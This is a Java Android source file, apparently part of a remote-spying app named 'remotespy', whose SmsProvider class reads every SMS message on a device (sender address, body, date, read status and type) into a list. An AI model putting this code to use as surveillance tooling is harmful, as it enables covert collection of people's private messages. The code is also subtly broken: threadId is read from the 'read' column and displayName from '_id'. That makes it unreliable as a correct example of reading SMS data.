package org.dalol.remotespy.data.providers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import org.dalol.remotespy.application.MainApplication;
import org.dalol.remotespy.data.vo.SmsVO;

import java.util.LinkedList;
import java.util.List;

/**
 * @author Filippo Engidashet
 * @version 1.0.0
 * @since Sun, 01/04/2018 at 12:26.
 */
public class SmsProvider implements Provider<List<SmsVO>> {

    @Override
    public List<SmsVO> getData() {

        List<SmsVO> lstSms = new LinkedList<>();
        Uri message = Uri.parse("content://sms/");

        Context context = MainApplication.getContext();

        if (context != null) {

            Cursor cursor = context.getContentResolver().query(message, null, null, null, null);

            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    for (int i = 0, totalSMS = cursor.getCount(); i < totalSMS; i++) {

                        SmsVO objSms = new SmsVO();
                        objSms.displayName = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                        objSms.address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        objSms.msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        objSms.threadId = cursor.getString(cursor.getColumnIndex("read"));
                        objSms.date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                        objSms.isRead = cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1;
                        objSms.subject = cursor.getString(cursor.getColumnIndexOrThrow("subject"));
                        if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                            objSms.type = "inbox";
                        } else {
                            objSms.type = "sent";
                        }
                        lstSms.add(objSms);
                        cursor.moveToNext();
                    }
                }
                cursor.close();
            }
        }
        return lstSms;
    }
}
